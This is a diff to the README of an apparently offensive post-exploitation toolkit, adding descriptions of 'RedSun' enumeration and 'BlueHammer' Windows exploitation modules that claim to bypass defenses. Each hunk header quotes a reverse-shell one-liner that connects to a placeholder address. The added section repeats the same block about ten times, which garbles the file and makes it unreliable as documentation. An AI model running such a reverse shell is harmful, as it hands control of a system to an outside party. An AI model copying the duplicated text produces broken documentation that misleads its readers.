@@ -329,6 +329,8 @@ bash -i >& /dev/tcp/203.0.113.45/8080 0>&1
 | Module | Description | Platform | Category |
 |--------|-------------|----------|----------|
 | **PEASS** | Privilege escalation awesome scripts suite | Linux/Windows | 🎯 Enumeration |
+| **RedSun** | Windows vulnerability enumeration from RedSun | Windows | 🎯 Enumeration |
+| **BlueHammer** | Windows exploitation toolkit from BlueHammer | Windows | ⚡ Exploitation |
 | **Linux Exploit Suggester** | Automated exploit recommendations | Linux | ⚡ Exploitation |
 | **LSE** | Linux smart enumeration tool | Linux | 🎯 Enumeration |
 | **Potato Exploits** | Windows privilege escalation methods | Windows | 🔑 Privilege Escalation |
@@ -379,8 +381,89 @@ bash -i >& /dev/tcp/203.0.113.45/8080 0>&1
 - **Cleanup**: Remove logs, history, and artifacts from target system
 - **Panix**: Linux persistence via systemd services
 
-#### 🧠 Forensics Modules
-- **Memory Dump**: Process memory analysis and extraction
+#### 🌞 **RedSun & 🔨 BlueHammer Modules**
+- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
+  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
+  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
+- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
+  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
+  - **🛡️ Windows Defenses**: Bypasses security mechanisms
+
+#### 🌞 **RedSun & 🔨 BlueHammer Modules**
+- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
+  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
+  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
+- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
+  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
+  - **🛡️ Windows Defenses**: Bypasses security mechanisms
+
+#### 🌞 **RedSun & 🔨 BlueHammer Modules**
+- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
+  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
+  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
+- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
+  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
+  - **🛡️ Windows Defenses**: Bypasses security mechanisms
+
+#### 🌞 **RedSun & 🔨 BlueHammer Modules**
+- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
+  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
+  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
+- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
+  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
+  - **🛡️ Windows Defenses**: Bypasses security mechanisms
+
+#### 🌞 **RedSun & 🔨 BlueHammer Modules**
+- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
+  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
+  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
+- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
+  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
+  - **🛡️ Windows Defenses**: Bypasses security mechanisms
+
+#### 🌞 **RedSun & 🔨 BlueHammer Modules**
+- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
+  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
+  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
+- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
+  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
+  - **🛡️ Windows Defenses**: Bypasses security mechanisms
+
+#### 🌞 **RedSun & 🔨 BlueHammer Modules**
+- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
+  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
+  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
+- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
+  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
+  - **🛡️ Windows Defenses**: Bypasses security mechanisms
+
+#### 🌞 **RedSun & 🔨 BlueHammer Modules**
+- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
+  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
+  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
+- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
+  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
+  - **🛡️ Windows Defenses**: Bypasses security mechanisms
+
+#### 🧠 **Forensics & Analysis Modules**
+- **🧠 Memory Dump**: Analyzes and extracts process memory for investigation
+- **📊 System Info**: Collects comprehensive target intelligence
+
+#### 🌞 **RedSun & 🔨 BlueHammer Modules**
+- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
+  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
+  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
+- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
+  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
+  - **🛡️ Windows Defenses**: Bypasses security mechanisms
+
+#### 🌞 **RedSun & 🔨 BlueHammer Modules**
+- **🌞 RedSun PEAS**: Windows vulnerability enumeration from RedSun repository
+  - **🔍 Windows Vulnerabilities**: Comprehensive Windows security analysis
+  - **🛡️ Defense Analysis**: Identifies security controls and bypasses
+- **🔨 BlueHammer**: Windows exploitation toolkit from BlueHammer repository
+  - **🔥 Advanced Exploits**: Tests Windows CVEs and vulnerabilities
+  - **🛡️ Windows Defenses**: Bypasses security mechanisms
 
 ### Detailed Module Examples
 
